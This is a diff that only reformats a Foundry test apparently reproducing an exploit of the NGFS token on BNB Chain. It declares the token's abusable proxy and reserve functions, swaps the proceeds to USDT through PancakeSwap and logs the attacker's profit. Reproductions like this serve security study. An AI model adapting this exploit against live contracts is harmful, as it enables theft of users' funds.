@@ -18,32 +18,41 @@ import "forge-std/Test.sol";
 // Hacking God:
 
 interface IPancakeFactory {
+
     function getPair(address, address) external returns (address);
+
 }
 
 interface IPancakeRouter {
+
     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
-        uint amountIn,
-        uint amountOutMin,
+        uint256 amountIn,
+        uint256 amountOutMin,
         address[] calldata path,
         address to,
-        uint deadline
+        uint256 deadline
     ) external;
+
 }
 
 interface INGFSToken {
+
     function delegateCallReserves() external;
     function setProxySync(address) external;
     function balanceOf(address) external view returns (uint256);
     function reserveMultiSync(address, uint256) external;
     function approve(address, uint256) external returns (bool);
+
 }
 
 interface IBEP20 {
+
     function balanceOf(address) external view returns (uint256);
+
 }
 
 contract NGFS is Test {
+
     uint256 constant BLOCKNUM_TO_FORK_FROM = 38_167_372;
     address constant PANCAKE_FACTORY = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
     address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
@@ -74,15 +83,12 @@ contract NGFS is Test {
 
         uint256 deadline = 1_714_043_885;
         IPancakeRouter(PANCAKE_ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            amount,
-            0,
-            path,
-            address(this),
-            deadline
+            amount, 0, path, address(this), deadline
         );
 
         uint256 tokenBalanceAfter = IBEP20(USDT_TOKEN).balanceOf(address(this));
         // Log balances after exploit
         emit log_named_decimal_uint("Attacker USDT Balance After exploit", tokenBalanceAfter - tokenBalanceBefore, 18);
     }
+
 }
